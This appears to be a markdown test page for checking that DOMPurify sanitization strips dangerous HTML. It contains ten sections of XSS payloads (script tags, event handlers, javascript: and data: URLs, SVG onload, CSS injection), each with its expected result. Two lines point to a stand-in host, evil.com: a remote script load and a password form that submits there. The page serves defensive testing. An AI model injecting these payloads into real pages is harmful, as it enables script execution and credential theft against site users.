# DOMPurify Sanitization Test

This file tests that dangerous HTML is stripped by DOMPurify.
FORBID_TAGS: form, input, textarea, select, button, object, embed, iframe

---

## 1. Script Tags

Expected: Nothing visible between the lines below.

---

<script>alert('XSS')</script>

<script src="https://evil.com/steal.js"></script>

---

If you see any text or elements between the lines above, sanitization FAILED.

## 2. Event Handlers

Expected: Text is visible, but clicking/hovering triggers NO alert.

<div onclick="alert('click')">Click me - no alert should fire on click</div>

<p onmouseover="alert('hover')">Hover me - no alert should fire on hover</p>

<a href="#" onmouseover="alert('hover link')">Hover this link - no alert should fire</a>

Verify in DevTools: inspect the elements above and confirm `onclick` / `onmouseover` attributes are absent.

## 3. Form Elements (FORBID_TAGS)

Expected: Only plain text fragments remain. No input fields, no text areas, no dropdown, no buttons.

<form action="https://evil.com/steal">
  <input type="text" name="password" placeholder="type here" />
  <textarea>Dangerous textarea</textarea>
  <select><option>Option A</option><option>Option B</option></select>
  <button type="submit">Submit</button>
</form>

You should see text like "Dangerous textarea", "Option A", "Option B", "Submit" as plain text only - no interactive form controls.

## 4. Embedded Content (FORBID_TAGS)

Expected: Nothing visible between the lines below.

---

<iframe src="https://example.com" width="400" height="200"></iframe>

<object data="https://example.com/payload.swf" width="400" height="200"></object>

<embed src="https://example.com/payload.swf" width="400" height="200" />

---

If you see any embedded frames or objects between the lines above, sanitization FAILED.

## 5. javascript: Protocol

Expected: Links are visible but clicking them does NOT execute JavaScript. The `href` should be removed or empty.

<a href="javascript:alert('XSS')">javascript link (should do nothing on click)</a>

[Markdown link with js](javascript:alert('XSS'))

Verify: click the links above - nothing should happen. Inspect in DevTools to confirm `href` is absent or empty.

## 6. data: URLs in Links

Expected: Link is visible but `href` should be sanitized.

<a href="data:text/html,<script>alert('XSS')</script>">data URL link (should do nothing)</a>

## 7. CSS Injection Attempts

Expected: Text is visible with no unusual visual effects.

<div style="background-image: url(javascript:alert('XSS'))">CSS injection attempt - should look like normal text</div>

<div style="behavior: url(xss.htc)">IE behavior attempt - should look like normal text</div>

## 8. SVG-based XSS

Expected: NO alerts, NO script execution. SVG elements may or may not render.

<svg onload="alert('SVG XSS')">
  <circle cx="50" cy="50" r="40" />
</svg>

<svg>
  <script>alert('SVG script')</script>
</svg>

## 9. Safe HTML (should be preserved)

Expected: All elements below should render normally.

<div>This plain div should be visible</div>

<span>Inline span should be visible</span>

<strong>Strong tag should be bold</strong>

<em>Emphasis tag should be italic</em>

<code>Code tag should be monospace</code>

<br />

<hr />

## 10. Mixed Content

Expected: Safe parts render normally, dangerous parts are silently removed.

This paragraph has <strong>bold text (safe)</strong> and <script>alert('evil')</script> a script tag (stripped). You should see: "This paragraph has **bold text (safe)** and a script tag (stripped)."

### Safe table in raw HTML

<table>
<tr><th>Header</th></tr>
<tr><td>Safe cell content</td></tr>
</table>

---

## How to verify

1. **Visual check**: Compare each section against its "Expected" description
2. **No alerts**: At no point should a browser alert/dialog appear
3. **DevTools**: Right-click > Inspect on suspicious elements to verify dangerous attributes are absent
4. **Console**: Open DevTools Console - no script errors from injected code should appear
